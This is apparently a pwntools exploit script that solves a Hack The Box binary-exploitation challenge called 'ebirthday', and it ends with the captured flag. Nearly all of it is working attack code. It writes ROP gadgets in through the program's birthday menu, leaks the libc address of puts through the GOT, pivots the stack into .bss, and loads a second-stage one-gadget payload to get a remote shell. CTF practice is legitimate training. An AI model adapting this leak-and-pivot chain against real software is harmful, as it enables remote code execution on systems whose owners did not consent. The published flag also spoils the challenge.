#!/usr/bin/env python3

from pwn import *

elf = ELF("./ebirthday")
libc = ELF("./libc.so.6")

context.binary = elf

def conn(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("docker.hackthebox.eu", 31551)
    else:
        return process(elf.path, *a, **kw)

gdbscript = f'''
b *set_username+123
handle SIGALRM ignore
continue
'''

def create_birthday(day, month):
    p.recvuntil("+------------------------------+")
    p.sendline("1")
    p.recvuntil("Type a day number: ")
    p.sendline(str(day))
    p.recvuntil("Type a month number: ")
    p.sendline(str(month))
    
def edit_birthday(idx, day, month):
    p.recvuntil("+------------------------------+")
    p.sendline("2")
    p.recvuntil("Type an index to edit: ")
    p.sendline(str(idx))
    p.recvuntil("Type a day number: ")
    p.sendline(str(day))
    p.recvuntil("Type a month number: ")
    p.sendline(str(month))

def delete_birthday(idx):
    p.recvuntil("+------------------------------+")
    p.sendline("3")
    p.recvuntil("Type an index to delete: ")
    p.sendline(str(idx))
    
def show_birthday(idx):
    p.recvuntil("+------------------------------+")
    p.sendline("4")
    p.recvuntil("Type an index to show: ")
    p.sendline(str(idx))
    print(p.recvline())
    print(p.recvline())
    
def set_username(username):
    p.recvuntil("+------------------------------+")
    p.sendline("5")
    p.recvuntil("Type an username:")
    p.send(username)

rbp_offset = 32
pop_rdi_ret = 0x0000000000400e23 #: pop rdi; ret;
pop_rsp_3_pop_ret = 0x0000000000400e1d #: pop rsp; pop r13; pop r14; pop r15; ret;
pop_rsi_r15_ret = 0x0000000000400e21 #: pop rsi; pop r15; ret;

p = conn()

bss_addr = 0x6020f8
new_stack_addr = elf.bss(0xFF)

# leak libc
create_birthday(pop_rdi_ret,0) 
create_birthday(elf.got['puts'],0) 
create_birthday(elf.plt['puts'],0)    

# read() new payload to new stack
create_birthday(pop_rdi_ret,0)        
create_birthday(0xdeadbeef,0)  # idx 4, later replaced by 0 with delete_birthday(4)
create_birthday(pop_rsi_r15_ret,0)   
create_birthday(new_stack_addr,0)     
create_birthday(0xdeadbeef,0) # junk
create_birthday(elf.plt['read'],0) 

# stack pivot
create_birthday(pop_rsp_3_pop_ret,0)    
create_birthday(new_stack_addr,0)    

delete_birthday(4)

# ret to same function (+offset) in order to replace rsp the second time
payload = b""
payload += b"A"*(rbp_offset)
payload += p64(bss_addr)     # rbp
payload += p64(0x0000000000400c0e) # rip = set_username+8

set_username(payload)

p.clean()
p.sendline()
p.recvline()
if args.REMOTE:
    p.recvline()
    
leak = int.from_bytes(p.recvline().strip(), "little")
libc.address = leak - libc.symbols['puts']

print("bss:", hex(bss_addr))
print("libc:", hex(libc.address))
print("new stack:", hex(new_stack_addr))

# rce
payload = b""
payload += p64(0xdeadbeef)  # junk
payload += p64(0xdeadbeef)  # junk
payload += p64(0xdeadbeef)  # junk
payload += p64(libc.address + 0x4f3c2) # one gadget

p.send(payload)
p.interactive()

# HTB{U_sH0uLD_NoT_f0rG3t_2_p1V0t}